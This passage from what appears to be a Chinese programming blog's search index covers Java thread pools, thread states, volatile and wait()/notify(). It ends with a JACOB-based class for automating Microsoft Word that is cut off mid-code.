<li><code>maximumPoolSize</code> – 池中允许的最大线程数。</li>
<li><code>keepAliveTime</code> –<br>当线程数大于核心时，此为终止前多余的空闲线程等待新任务的最长时间。</li>
<li><code>unit</code> – keepAliveTime 参数的时间单位。</li>
<li><code>workQueue</code> – 执行前用于保持任务的队列。此队列仅保持由 execute方法提交的 Runnable任务。</li>
<li><code>threadFactory</code> – 执行程序创建新线程时使用的工厂。</li>
<li><code>handler</code> – 由于超出线程范围和队列容量而使执行被阻塞时所使用的处理程序。</li>
</ol>
<p><code>unit</code>可选的参数为<code>java.util.concurrent.TimeUnit</code>中的几个静态属性：</p>
<pre><code>NANOSECONDS、MICROSECONDS、MILLISECONDS、SECONDS
</code></pre>
<p>workQueue常用的是：</p>
<pre><code>java.util.concurrent.ArrayBlockingQueue
</code></pre>
<p><strong>handler有四个选择：</strong></p>
<ol>
<li>ThreadPoolExecutor.AbortPolicy()<br>抛出java.util.concurrent.RejectedExecutionException异常</li>
<li>ThreadPoolExecutor.CallerRunsPolicy()<br>重试添加当前的任务，他会自动重复调用execute()方法</li>
<li>ThreadPoolExecutor.DiscardOldestPolicy()<br>抛弃旧的任务</li>
<li>ThreadPoolExecutor.DiscardPolicy()<br>抛弃当前的任务</li>
</ol>
<p><strong>示例：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//这句话的意思是</span><br><span class="line">//初始线程池是3各线程</span><br><span class="line">//如果一下子任务过多，就创建线程但是不能超过5各</span><br><span class="line">//也就是说最多可以一次处理5各任务</span><br><span class="line">//如果一次来30各任务，第一次只能处理5个任务</span><br><span class="line">//剩下的任务中有4各可以放到队列里面</span><br><span class="line">//如果队列都放不下，拒绝接受任务</span><br><span class="line">//因此来了30各任务，只能处理9个</span><br><span class="line">ThreadPoolExecutor te = new ThreadPoolExecutor(3, 5, 5,</span><br><span class="line">         TimeUnit.SECONDS, new ArrayBlockingQueue&lt;runnable&gt;(4),</span><br><span class="line">         new ThreadPoolExecutor.DiscardOldestPolicy());</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA同步之线程状态</title>
    <url>/blog/plang/java/threadsafe/threadstatus/</url>
    <content><![CDATA[<ol>
<li>新建状态（New）：新创建了一个线程对象。</li>
</ol>
<p>2.就绪状态（Runnable）：线程对象创建后，其他线程调用了该对象的start()方法。该状态的线程位于可运行线程池中，变得可运行，等待获取CPU的使用权。</p>
<ol start="3">
<li>运行状态（Running）：就绪状态的线程获取了CPU，执行程序代码。</li>
</ol>
<p>4.阻塞状态（Blocked）：阻塞状态是线程因为某种原因放弃CPU使用权，暂时停止运行。直到线程进入就绪状态，才有机会转到运行状态。阻塞的情况分三种：</p>
<p>（一）、等待阻塞：运行的线程执行wait()方法，JVM会把该线程放入等待池中。</p>
<p>（二）、同步阻塞：运行的线程在获取对象的同步锁时，若该同步锁被别的线程占用，则JVM会把该线程放入锁池中。</p>
<p>（三）、其他阻塞：运行的线程执行sleep()或join()方法，或者发出了I&#x2F;O请求时，JVM会把该线程置为阻塞状态。当sleep()状态超时、join()等待线程终止或者超时、或者I&#x2F;O处理完毕时，线程重新转入就绪状态。</p>
<p>5.死亡状态（Dead）：线程执行完了或者因异常退出了run()方法，该线程结束生命周期。</p>
<p><img src="/images/java/threadstatus.jpg"></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈Java的volatile</title>
    <url>/blog/plang/java/threadsafe/volatile/</url>
    <content><![CDATA[<p><strong>Java</strong> 语言中的 <strong>volatile</strong> 变量可以被看作是一种 “程度较轻的synchronized”；与 synchronized 块相比，volatile变量所需的编码较少，并且运行时开销也较少，但是它所能实现的功能也仅是synchronized 的一部分。</p>
<p>我们知道，在Java中设置变量值的操作，除了long和double类型的变量外都是原子操作，也就是说，对于变量值的简单读写操作没有必要进行同步。</p>
<p>这在JVM1.2之前，Java的内存模型实现总是从主存读取变量，是不需要进行特别的注意的。而随着JVM的成熟和优化，现在在多线程环境下volatile关键字的使用变得非常重要。</p>
<p>在当前的Java内存模型下，线程可以把变量保存在本地内存（比如机器的寄存器）中，而不是直接在主存中进行读写。这就可能造成一个线程在主存中修改了一个变量的值，而另外一个线程还继续使用它在寄存器中的变量值的拷贝，造成数据的不一致。</p>
<p>要解决这个问题，只需要像在本程序中的这样，把该变量声明为volatile（不稳定的）即可，这就指示JVM，这个变量是不稳定的，每次使用它都到主存中进行读取。一般说来，多任务环境下各任务间共享的标志都应该加volatile修饰。</p>
<p>Volatile修饰的成员变量在每次被线程访问时，都强迫从共享内存中重读该成员变量的值。而且，当成员变量发生变化时，强迫线程将变化值回写到共享内存。这样在任何时刻，两个不同的线程总是看到某个成员变量的同一个值。</p>
<p>Java语言规范中指出：为了获得最佳速度，允许线程保存共享成员变量的私有拷贝，而且只当线程进入或者离开同步代码块时才与共享成员变量的原始值对比。</p>
<p>这样当多个线程同时与某个对象交互时，就必须要注意到要让线程及时的得到共享成员变量的变化。</p>
<p>而volatile关键字就是提示VM：对于这个成员变量不能保存它的私有拷贝，而应直接与共享成员变量交互。</p>
<p>使用建议：在两个或者更多的线程访问的成员变量上使用volatile。当要访问的变量已在synchronized代码块中，或者为常量时，不必使用。</p>
<p>由于使用屏蔽掉了VM中必要的代码优化，所以在效率上比较低，因此一定在必要时才使用此关键字。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Counter &#123;</span><br><span class="line"></span><br><span class="line">    public static int count = 0;</span><br><span class="line">    public static void inc() &#123;</span><br><span class="line">        //这里延迟1毫秒，使得结果明显</span><br><span class="line">        try &#123;</span><br><span class="line">            Thread.sleep(1);</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //同时启动1000个线程，去进行i++计算，看看实际结果</span><br><span class="line"></span><br><span class="line">        for (int i = 0; i &lt; 1000; i++) &#123;</span><br><span class="line">            new Thread(new Runnable() &#123;</span><br><span class="line">                @Override</span><br><span class="line">                public void run() &#123;</span><br><span class="line">                    Counter.inc();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">        //这里每次运行的值都有可能不同,可能为1000</span><br><span class="line">        System.out.println(&quot;运行结果:Counter.count=&quot; + Counter.count);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:Counter.count&#x3D;995</p>
<p>实际运算结果每次可能都不一样，本机的结果为：运行结果:Counter.count&#x3D;995，可以看出，在多线程的环境下，Counter.count并没有期望结果是1000</p>
<p>很多人以为，这个是多线程并发问题，只需要在变量count之前加上volatile就可以避免这个问题，那我们在修改代码看看，看看结果是不是符合我们的期望</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Counter &#123;</span><br><span class="line">    public volatile static int count = 0;</span><br><span class="line">    public static void inc() &#123;</span><br><span class="line"></span><br><span class="line">        //这里延迟1毫秒，使得结果明显</span><br><span class="line">        try &#123;</span><br><span class="line">            Thread.sleep(1);</span><br><span class="line">        &#125; catch (InterruptedException e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        //同时启动1000个线程，去进行i++计算，看看实际结果</span><br><span class="line">        for (int i = 0; i &lt; 1000; i++) &#123;</span><br><span class="line">            new Thread(new Runnable() &#123;</span><br><span class="line">                @Override</span><br><span class="line">                public void run() &#123;</span><br><span class="line">                    Counter.inc();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //这里每次运行的值都有可能不同,可能为1000</span><br><span class="line">        System.out.println(&quot;运行结果:Counter.count=&quot; + Counter.count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果:Counter.count&#x3D;992</p>
<p>运行结果还是没有我们期望的1000，下面我们分析一下原因</p>
<p>在 java<br>垃圾回收整理一文中，描述了jvm运行时刻内存的分配。其中有一个内存区域是jvm虚拟机栈，每一个线程运行时都有一个线程栈，</p>
<p>线程栈保存了线程运行时候变量值信息。当线程访问某一个对象时候值的时候，首先通过对象的引用找到对应在堆内存的变量的值，然后把堆内存</p>
<p>变量的具体值load到线程本地内存中，建立一个变量副本，之后线程就不再和对象在堆内存变量值有任何关系，而是直接修改副本变量的值，</p>
<p>在修改完之后的某一个时刻（线程退出之前），自动把线程变量副本的值回写到对象在堆中变量。这样在堆中的对象的值就产生变化了。下面一幅图</p>
<p>描述这写交互</p>
<p><a href="/images/java/counter.jpg"></a></p>
<p>read and load 从主存复制变量到当前工作内存 use and assign执行代码，改变共享变量值 store and write 用工作内存数据刷新主存相关内容</p>
<p>其中use and assign 可以多次出现</p>
<p>但是这一些操作并不是原子性，也就是 在readload之后，如果主内存count变量发生修改之后，线程工作内存中的值由于已经加载，不会产生对应的变化，所以计算出来的结果会和预期不一样</p>
<p>对于volatile修饰的变量，jvm虚拟机只是保证从主内存加载到线程工作内存的值是最新的</p>
<p>例如假如线程1，线程2 在进行read,load操作中，发现主内存中count的值都是5，那么都会加载这个最新的值</p>
<p>在线程1堆count进行修改之后，会write到主内存中，主内存中的count变量就会变为6</p>
<p>线程2由于已经进行read,load操作，在进行运算之后，也会更新主内存count的变量值为6</p>
<p>导致两个线程及时用volatile关键字修改之后，还是会存在并发的情况。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA同步之wait()和notify()的使用</title>
    <url>/blog/plang/java/threadsafe/waitnotify/</url>
    <content><![CDATA[<p>wait()&#x2F;notify()：调用任意对象的 wait()方法导致线程阻塞，并且该对象上的锁被释放。而调用任意对象的notify()方法则导致因调用该对象的wait()方法而阻塞的线程中随机选择的一个解除阻塞（但要等到获得锁后才真正可执行）。</p>
<p>synchronized与这两个方法之间的关系：</p>
<p>1.有synchronized的地方不一定有wait,notify</p>
<p>2.有wait,notify的地方必有synchronized.这是因为wait和notify不是属于线程类，而是每一个对象都具有的方法（事实上，这两个方法是Object类里的），而且，这两个方法都和对象锁有关，有锁的地方，必有synchronized。</p>
<p>锁是针对对象的，wait()&#x2F;notify()的操作是与对象锁相关的，那么把wait()&#x2F;notify()设计在Object中也就是合情合理的了。</p>
<p>为什么有wait,notify的地方必有synchronized？</p>
<p>synchronized方法中由当前线程占有锁。另一方面，调用wait()notify()方法的对象上的锁必须为当前线程所拥有。因此，wait()notify()方法调用必须放置在synchronized方法中，synchronized方法的上锁对象就是调用wait()notify()方法的对象。若不满足这一条件，则程序虽然仍能编译，但在运行时会出现IllegalMonitorStateException异常。</p>
<p>能调用wait()&#x2F;notify()的只有当前线程，前提是必须获得了对象锁，就是说必须要进入到synchronized方法中。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>【JAVA】jacob操作word接口api</title>
    <url>/blog/plang/java/lib/jacobcode/</url>
    <content><![CDATA[<p><a href="jacobbase.php">JACOB使用简介</a></p>
<p>测试源码包：</p>
<p>链接: <a href="http://pan.baidu.com/s/1mg9tsZA">http://pan.baidu.com/s/1mg9tsZA</a></p>
<p>密码: ej9u</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import com.jacob.activeX.ActiveXComponent;</span><br><span class="line">import com.jacob.com.ComThread;</span><br><span class="line">import com.jacob.com.Dispatch;</span><br><span class="line">import com.jacob.com.Variant;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * </span><br><span class="line"> */</span><br><span class="line">public class MSWordManager &#123;</span><br><span class="line">    // word文档</span><br><span class="line">    private Dispatch doc;</span><br><span class="line">    // word运行程序对象</span><br><span class="line">    private ActiveXComponent word;</span><br><span class="line">    // 所有word文档集合</span><br><span class="line">    private Dispatch documents;</span><br><span class="line">    // 选定的范围或插入点</span><br><span class="line">    private Dispatch selection;</span><br><span class="line"></span><br><span class="line">    private boolean saveOnExit = true;</span><br><span class="line"></span><br><span class="line">    public MSWordManager() &#123;</span><br><span class="line">        if (word == null) &#123;</span><br><span class="line">            word = new ActiveXComponent(&quot;Word.Application&quot;);</span><br><span class="line">            word.setProperty(&quot;Visible&quot;, new Variant(false));</span><br><span class="line">        &#125;</span><br><span class="line">        if (documents == null)</span><br><span class="line">            documents = word.getProperty(&quot;Documents&quot;).toDispatch();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 设置退出时参数</span><br><span class="line">     * </span><br><span class="line">     * @param saveOnExit</span><br><span class="line">     *            boolean true-退出时保存文件，false-退出时不保存文件</span><br><span class="line">     */</span><br><span class="line">    public void setSaveOnExit(boolean saveOnExit) &#123;</span><br><span class="line">        this.saveOnExit = saveOnExit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 创建一个新的word文档</span><br><span class="line">     * </span><br><span class="line">     */</span><br><span class="line">    public void createNewDocument() &#123;</span><br><span class="line">        doc = Dispatch.call(documents, &quot;Add&quot;).toDispatch();</span><br><span class="line">        selection = Dispatch.get(word, &quot;Selection&quot;).toDispatch();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 打开一个已存在的文档</span><br><span class="line">     * </span><br><span class="line">     * @param docPath</span><br><span class="line">     */</span><br><span class="line">    public void openDocument(String docPath) &#123;</span><br><span class="line">        closeDocument();</span><br><span class="line">        doc = Dispatch.call(documents, &quot;Open&quot;, docPath).toDispatch();</span><br><span class="line">        selection = Dispatch.get(word, &quot;Selection&quot;).toDispatch();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 把选定的内容或插入点向上移动</span><br><span class="line">     * </span><br><span class="line">     * @param pos</span><br><span class="line">     *            移动的距离</span><br><span class="line">     */</span><br><span class="line">    public void moveUp(int pos) &#123;</span><br><span class="line">        if (selection == null)</span><br><span class="line">            selection = Dispatch.get(word, &quot;Selection&quot;).toDispatch();</span><br><span class="line">        for (int i = 0; i &lt; pos; i++)</span><br><span class="line">            Dispatch.call(selection, &quot;MoveUp&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 把选定的内容或者插入点向下移动</span><br><span class="line">     * </span><br><span class="line">     * @param pos</span><br><span class="line">     *            移动的距离</span><br><span class="line">     */</span><br><span class="line">    public void moveDown(int pos) &#123;</span><br><span class="line">        if (selection == null)</span><br><span class="line">            selection = Dispatch.get(word, &quot;Selection&quot;).toDispatch();</span><br><span class="line">        for (int i = 0; i &lt; pos; i++)</span><br><span class="line">            Dispatch.call(selection, &quot;MoveDown&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 把选定的内容或者插入点向左移动</span><br><span class="line">     * </span><br><span class="line">     * @param pos</span><br><span class="line">     *            移动的距离</span><br><span class="line">     */</span><br><span class="line">    public void moveLeft(int pos) &#123;</span><br><span class="line">        if (selection == null)</span><br><span class="line">            selection = Dispatch.get(word, &quot;Selection&quot;).toDispatch();</span><br><span class="line">        for (int i = 0; i &lt; pos; i++) &#123;</span><br><span class="line">            Dispatch.call(selection, &quot;MoveLeft&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 把选定的内容或者插入点向右移动</span><br><span class="line">     * </span><br><span class="line">     * @param pos</span><br><span class="line">     *            移动的距离</span><br><span class="line">     */</span><br><span class="line">    public void moveRight(int pos) &#123;</span><br><span class="line">        if (selection == null)</span><br><span class="line">            selection = Dispatch.get(word, &quot;Selection&quot;).toDispatch();</span><br><span class="line">        for (int i = 0; i &lt; pos; i++)</span><br><span class="line">            Dispatch.call(selection, &quot;MoveRight&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 把插入点移动到文件首位置</span><br><span class="line">     * </span><br><span class="line">     */</span><br><span class="line">    public void moveStart() &#123;</span><br><span class="line">        if (selection == null)</span><br><span class="line">            selection = Dispatch.get(word, &quot;Selection&quot;).toDispatch();</span><br><span class="line">        Dispatch.call(selection, &quot;HomeKey&quot;, new Variant(6));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 从选定内容或插入点开始查找文本</span><br><span class="line">     * </span><br><span class="line">     * @param toFindText</span><br><span class="line">     *            要查找的文本</span><br><span class="line">     * @return boolean true-查找到并选中该文本，false-未查找到文本</span><br><span class="line">     */</span><br><span class="line">    public boolean find(String toFindText) &#123;</span><br><span class="line">        if (toFindText == null || toFindText.equals(&quot;&quot;))</span><br><span class="line">            return false;</span><br><span class="line">        // 从selection所在位置开始查询</span><br><span class="line">        Dispatch find = ActiveXComponent.call(selection, &quot;Find&quot;).toDispatch();</span><br><span class="line">        // 设置要查找的内容</span><br><span class="line">        Dispatch.put(find, &quot;Text&quot;, toFindText);</span><br><span class="line">        // 向前查找</span><br><span class="line">        Dispatch.put(find, &quot;Forward&quot;, &quot;True&quot;);</span><br><span class="line">        // 设置格式</span><br><span class="line">        Dispatch.put(find, &quot;Format&quot;, &quot;True&quot;);</span><br><span class="line">        // 大小写匹配</span><br><span class="line">        Dispatch.put(find, &quot;MatchCase&quot;, &quot;True&quot;);</span><br><span class="line">        // 全字匹配</span><br><span class="line">        Dispatch.put(find, &quot;MatchWholeWord&quot;, &quot;True&quot;);</span><br><span class="line">        // 查找并选中</span><br><span class="line">        return Dispatch.call(find, &quot;Execute&quot;).getBoolean();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 把选定选定内容设定为替换文本</span><br><span class="line">     * </span><br><span class="line">     * @param toFindText</span><br><span class="line">     *            查找字符串</span><br><span class="line">     * @param newText</span><br><span class="line">     *            要替换的内容</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public boolean replaceText(String toFindText, String newText) &#123;</span><br><span class="line">        if (!find(toFindText))</span><br><span class="line">            return false;</span><br><span class="line">        Dispatch.put(selection, &quot;Text&quot;, newText);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 全局替换文本</span><br><span class="line">     * </span><br><span class="line">     * @param toFindText</span><br><span class="line">     *            查找字符串</span><br><span class="line">     * @param newText</span><br><span class="line">     *            要替换的内容</span><br><span class="line">     */</span><br><span class="line">    public void replaceAllText(String toFindText, String newText) &#123;</span><br><span class="line">        while (find(toFindText)) &#123;</span><br><span class="line">            Dispatch.put(selection, &quot;Text&quot;, newText);</span><br><span class="line">            Dispatch.call(selection, &quot;MoveRight&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 在当前插入点插入字符串</span><br><span class="line">     * </span><br><span class="line">     * @param newText</span><br><span class="line">     *            要插入的新字符串</span><br><span class="line">     */</span><br><span class="line">    public void insertText(String newText) &#123;</span><br><span class="line">        Dispatch.put(selection, &quot;Text&quot;, newText);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * </span><br><span class="line">     * @param toFindText</span><br><span class="line">     *            要查找的字符串</span><br><span class="line">     * @param imagePath</span><br><span class="line">     *            图片路径</span><br><span class="line">     * @return</span><br><span class="line">     */</span><br><span class="line">    public boolean replaceImage(String toFindText, String imagePath) &#123;</span><br><span class="line">        if (!find(toFindText))</span><br><span class="line">            return false;</span><br><span class="line">        Dispatch.call(Dispatch.get(selection, &quot;InLineShapes&quot;).toDispatch(),</span><br><span class="line">                &quot;AddPicture&quot;, imagePath);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 全局替换图片</span><br><span class="line">     * </span><br><span class="line">     * @param toFindText</span><br><span class="line">     *            查找字符串</span><br><span class="line">     * @param imagePath</span><br><span class="line">     *            图片路径</span><br><span class="line">     */</span><br><span class="line">    public void replaceAllImage(String toFindText, String imagePath) &#123;</span><br><span class="line">        while (find(toFindText)) &#123;</span><br><span class="line">            Dispatch.call(Dispatch.get(selection, &quot;InLineShapes&quot;).toDispatch(),</span><br><span class="line">                    &quot;AddPicture&quot;, imagePath);</span><br><span class="line">            Dispatch.call(selection, &quot;MoveRight&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 在当前插入点插入图片</span><br><span class="line">     * </span><br><span class="line">     * @param imagePath</span><br><span class="line">     *            图片路径</span><br><span class="line">     */</span><br><span class="line">    public void insertImage(String imagePath) &#123;</span><br><span class="line">        Dispatch.call(Dispatch.get(selection, &quot;InLineShapes&quot;).toDispatch(),</span><br><span class="line">                &quot;AddPicture&quot;, imagePath);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 合并单元格</span><br><span class="line">     * </span><br><span class="line">     * @param tableIndex</span><br><span class="line">     * @param fstCellRowIdx</span><br><span class="line">     * @param fstCellColIdx</span><br><span class="line">     * @param secCellRowIdx</span><br><span class="line">     * @param secCellColIdx</span><br><span class="line">     */</span><br><span class="line">    public void mergeCell(int tableIndex, int fstCellRowIdx, int fstCellColIdx,</span><br><span class="line">            int secCellRowIdx, int secCellColIdx) &#123;</span><br><span class="line">        // 所有表格</span><br><span class="line">        Dispatch tables = Dispatch.get(doc, &quot;Tables&quot;).toDispatch();</span><br><span class="line">        // 要填充的表格</span><br><span class="line">        Dispatch table = Dispatch.call(tables, &quot;Item&quot;, new Variant(tableIndex))</span><br><span class="line">                .toDispatch();</span><br><span class="line">        Dispatch fstCell = Dispatch.call(table, &quot;Cell&quot;,</span><br><span class="line">                new Variant(fstCellRowIdx), new Variant(fstCellColIdx))</span><br><span class="line">                .toDispatch();</span><br><span class="line">        Dispatch secCell = Dispatch.call(table, &quot;Cell&quot;,</span><br><span class="line">                new Variant(secCellRowIdx), new Variant(secCellColIdx))</span><br><span class="line">                .toDispatch();</span><br><span class="line">        Dispatch.call(fstCell, &quot;Merge&quot;, secCell);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 在指定的单元格里填写数据</span><br><span class="line">     * </span><br><span class="line">     * @param tableIndex</span><br><span class="line">     * @param cellRowIdx</span><br><span class="line">     * @param cellColIdx</span><br><span class="line">     * @param txt</span><br><span class="line">     */</span><br><span class="line">    public void putTxtToCell(int tableIndex, int cellRowIdx, int cellColIdx,</span><br><span class="line">            String txt) &#123;</span><br><span class="line">        // 所有表格</span><br><span class="line">        Dispatch tables = Dispatch.get(doc, &quot;Tables&quot;).toDispatch();</span><br><span class="line">        // 要填充的表格</span><br><span class="line">        Dispatch table = Dispatch.call(tables, &quot;Item&quot;, new Variant(tableIndex))</span><br><span class="line">                .toDispatch();</span><br><span class="line">        Dispatch cell = Dispatch.call(table, &quot;Cell&quot;, new Variant(cellRowIdx),</span><br><span class="line">                new Variant(cellColIdx)).toDispatch();</span><br><span class="line">        Dispatch.call(cell, &quot;Select&quot;);</span><br><span class="line">        Dispatch.put(selection, &quot;Text&quot;, txt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 在当前文档拷贝剪贴板数据</span><br><span class="line">     * </span><br><span class="line">     * @param pos</span><br><span class="line">     */</span><br><span class="line">    public void pasteExcelSheet(String pos) &#123;</span><br><span class="line">        moveStart();</span><br><span class="line">        if (this.find(pos)) &#123;</span><br><span class="line">            Dispatch textRange = Dispatch.get(selection, &quot;Range&quot;).toDispatch();</span><br><span class="line">            Dispatch.call(textRange, &quot;Paste&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 在当前文档指定的位置拷贝表格</span><br><span class="line">     * </span><br><span class="line">     * @param pos</span><br><span class="line">     *            当前文档指定的位置</span><br><span class="line">     * @param tableIndex</span><br><span class="line">     *            被拷贝的表格在word文档中所处的位置</span><br><span class="line">     */</span><br><span class="line">    public void copyTable(String pos, int tableIndex) &#123;</span><br><span class="line">        // 所有表格</span><br><span class="line">        Dispatch tables = Dispatch.get(doc, &quot;Tables&quot;).toDispatch();</span><br><span class="line">        // 要填充的表格</span><br><span class="line">        Dispatch table = Dispatch.call(tables, &quot;Item&quot;, new Variant(tableIndex))</span><br><span class="line">                .toDispatch();</span><br><span class="line">        Dispatch range = Dispatch.get(table, &quot;Range&quot;).toDispatch();</span><br><span class="line">        Dispatch.call(range, &quot;Copy&quot;);</span><br><span class="line">        if (this.find(pos)) &#123;</span><br><span class="line">            Dispatch textRange = Dispatch.get(selection, &quot;Range&quot;).toDispatch();</span><br><span class="line">            Dispatch.call(textRange, &quot;Paste&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 在当前文档指定的位置拷贝来自另一个文档中的表格</span><br><span class="line">     * </span><br><span class="line">     * @param anotherDocPath</span><br><span class="line">     *            另一个文档的磁盘路径</span><br><span class="line">     * @param tableIndex</span><br><span class="line">     *            被拷贝的表格在另一格文档中的位置</span><br><span class="line">     * @param pos</span><br><span class="line">     *            当前文档指定的位置</span><br><span class="line">     */</span><br><span class="line">    public void copyTableFromAnotherDoc(String anotherDocPath, int tableIndex,</span><br><span class="line">            String pos) &#123;</span><br><span class="line">        Dispatch doc2 = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            doc2 = Dispatch.call(documents, &quot;Open&quot;, anotherDocPath)</span><br><span class="line">                    .toDispatch();</span><br><span class="line">            // 所有表格</span><br><span class="line">            Dispatch tables = Dispatch.get(doc2, &quot;Tables&quot;).toDispatch();</span><br><span class="line">            // 要填充的表格</span><br><span class="line">            Dispatch table = Dispatch.call(tables, &quot;Item&quot;,</span><br><span class="line">                    new Variant(tableIndex)).toDispatch();</span><br><span class="line">            Dispatch range = Dispatch.get(table, &quot;Range&quot;).toDispatch();</span><br><span class="line">            Dispatch.call(range, &quot;Copy&quot;);</span><br><span class="line">            if (this.find(pos)) &#123;</span><br><span class="line">                Dispatch textRange = Dispatch.get(selection, &quot;Range&quot;)</span><br><span class="line">                        .toDispatch();</span><br><span class="line">                Dispatch.call(textRange, &quot;Paste&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            if (doc2 != null) &#123;</span><br><span class="line">                Dispatch.call(doc2, &quot;Close&quot;, new Variant(saveOnExit));</span><br><span class="line">                doc2 = null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 在当前文档指定的位置拷贝来自另一个文档中的图片</span><br><span class="line">     * </span><br><span class="line">     * @param anotherDocPath</span><br><span class="line">     *            另一个文档的磁盘路径</span><br><span class="line">     * @param shapeIndex</span><br><span class="line">     *            被拷贝的图片在另一格文档中的位置</span><br><span class="line">     * @param pos</span><br><span class="line">     *            当前文档指定的位置</span><br><span class="line">     */</span><br><span class="line">    public void copyImageFromAnotherDoc(String anotherDocPath, int shapeIndex,</span><br><span class="line">            String pos) &#123;</span><br><span class="line">        Dispatch doc2 = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            doc2 = Dispatch.call(documents, &quot;Open&quot;, anotherDocPath)</span><br><span class="line">                    .toDispatch();</span><br><span class="line">            Dispatch shapes = Dispatch.get(doc2, &quot;InLineShapes&quot;).toDispatch();</span><br><span class="line">            Dispatch shape = Dispatch.call(shapes, &quot;Item&quot;,</span><br><span class="line">                    new Variant(shapeIndex)).toDispatch();</span><br><span class="line">            Dispatch imageRange = Dispatch.get(shape, &quot;Range&quot;).toDispatch();</span><br><span class="line">            Dispatch.call(imageRange, &quot;Copy&quot;);</span><br><span class="line">            if (this.find(pos)) &#123;</span><br><span class="line">                Dispatch textRange = Dispatch.get(selection, &quot;Range&quot;)</span><br><span class="line">                        .toDispatch();</span><br><span class="line">                Dispatch.call(textRange, &quot;Paste&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            if (doc2 != null) &#123;</span><br><span class="line">                Dispatch.call(doc2, &quot;Close&quot;, new Variant(saveOnExit));</span><br><span class="line">                doc2 = null;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * 创建表格</span><br><span class="line"> 